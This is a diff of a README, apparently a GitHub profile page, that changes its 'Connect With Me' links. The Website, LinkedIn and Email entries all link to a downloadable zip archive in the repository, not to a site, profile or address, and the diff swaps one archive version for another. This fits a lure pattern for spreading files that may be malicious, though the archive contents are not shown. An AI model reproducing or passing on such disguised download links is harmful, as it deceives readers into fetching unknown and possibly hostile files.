@@ -65,9 +65,9 @@ Project Management • Software Testing • UI/UX • Content Creation • Techn
 
 ## 📫 Connect With Me
 
-* 🌐 Website: [https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip](https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip)
-* 💼 LinkedIn: [https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip](https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip)
-* 📧 Email: [https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip](https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab_Jnewton_1.6-alpha.5.zip)
+* 🌐 Website: [https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab-Jnewton-v1.1.zip](https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab-Jnewton-v1.1.zip)
+* 💼 LinkedIn: [https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab-Jnewton-v1.1.zip](https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab-Jnewton-v1.1.zip)
+* 📧 Email: [https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab-Jnewton-v1.1.zip](https://raw.githubusercontent.com/Jnewton-lab/Jnewton-lab/main/whewer/lab-Jnewton-v1.1.zip)
 
 ---
 
